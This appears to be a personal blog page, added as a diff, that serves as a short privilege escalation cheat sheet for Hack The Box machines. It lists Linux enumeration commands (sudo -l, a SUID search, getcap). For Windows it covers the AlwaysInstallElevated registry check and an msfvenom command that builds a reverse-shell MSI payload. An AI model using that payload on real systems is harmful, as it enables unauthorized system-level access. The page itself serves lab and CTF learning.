@@ -1,0 +1,47 @@
+<html>
+<head>
+	<title>PrivEsc</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="/CSS/blog.css">
+	<link rel="stylesheet" href="/CSS/global.css">
+</head>
+<body class="noselect">
+	<h1 id="title" class="blog_title">
+		<a href="/index.html" class="homelink">
+			PrivEsc
+		</a>
+		<div class="subtext">
+		<p class="subtext-content content">These are all the ways I've encountered to do/find a privilege escalation. This is not an exhaustive list, but I've found they are quite common, at least among HTB boxes.</p>
+	</div>
+	</h1>
+	<div id="big_wrapper" class="wordwrap">
+		<div class="paragraph">
+			<div id="menu">
+				<a href="/index.html" class="menu_item">Home</a>
+				<a href="/Blogs/TLDR/privesc.html" class="menu_item">TLDR</a>
+				<a href="/Blogs/index.html" class="menu_item">All Blogs</a>
+				<a href="/Blogs/resources.html" class="menu_item">Resources</a>
+				<hr>
+			</div>
+		</div>
+
+<div class="paragraph">
+	<p class="subtitle">Linux:</p>
+<p class="content"><ul class="content"><li><span class="code">id</span><br>Better than "whoami" because it might show interesting groups.</li><li><span class="code">sudo -l</span><br>Lists all files the current user has permission to execute as root.</li><li><span class="code">find / -perm 4000 2&gt;/dev/null</span><br>Lists all files that have SUID bit set.</li><li><span class="code">getcap -r / 2&gt;/dev/null</span><br>Lists all files with capabilities.</li></ul></p>
+</div>
+<div class="paragraph">
+	<p class="subtitle">Windows:</p>
+<p class="content"><ul class="content"><li><span class="code">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="code">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br>If both are set to 1, the system installs MSI packages as nt authority/system. Generate a reverse shell using something like msfvenom to generate a payload: <span class="code">msfvenom -p windows/x64/shell/reverse_tcp -f msi LHOST=&lt;your ip&gt; LPORT=&lt;your port&gt; RHOST=&lt;target ip&gt; &gt; hack.msi</span>.</li></ul></p>
+</div>
+		<br>
+		<div class="paragraph">
+			<hr>
+			<p class="content">Last edit: 2021.08.29</p>
+		</div>
+	</div>
+</body>
+<footer>
+	<script type="text/javascript" src="/JS/blog.js"></script>
+</footer>
+</html>
